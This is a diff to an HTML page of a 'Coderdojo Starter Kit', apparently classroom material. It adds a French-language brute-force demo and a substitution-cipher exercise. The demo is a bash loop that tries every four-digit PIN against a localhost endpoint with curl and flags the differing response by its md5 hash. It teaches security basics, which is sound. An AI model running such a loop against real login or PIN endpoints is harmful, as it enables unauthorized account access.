@@ -1,14 +1,38 @@
 <!DOCTYPE html>
 <html>
+
 <head>
   <title>Coderdojo Starter Kit</title>
 
   <script src="js/jquery.js"></script>
   <script src="js/main.js"></script>
-
+  <meta charset="UTF-8" />
   <link href="css/style.css" rel="stylesheet" type="text/css" media="all">
 </head>
+
 <body>
   <h1>Hello World!</h1>
+  <h2>Force brute</h2>
+  Il n'est malheureusement pas possible de faire un appel réseau depuis javascript vers un site protégé correctement. Une petite
+  demo peut être nécéssaire. Nous allons utiliser bash présent sous mac et la plupart des linux. Il existe une version pour
+  windows fournie avec git.
+
+  <code><pre>
+    for i in $(seq 1 9999); do 
+      code=`printf %04d $i`
+      echo \
+        $(curl -s "http://localhost:8080/Step1?authtoken=???????????&pincode="$code | md5sum)\
+        $code;
+    done | uniq -w 35
+  </pre></code>
+  <h2>Codes à substitution</h2>
+  <div style="display: flex; flex-wrap: wrap;">
+    <textarea style="width: 48%" rows=13 id="alphabetsource"></textarea>
+    <textarea style="width: 48%" rows=13 id="alphabetdestination">abcdefghijklmnopqrstuvwxyz</textarea>
+    <br/>
+    <textarea style="width: 48%" rows="35" id="message"></textarea>
+    <div style="width: 48%" id="result"></div>
+  </div>
 </body>
+
 </html>
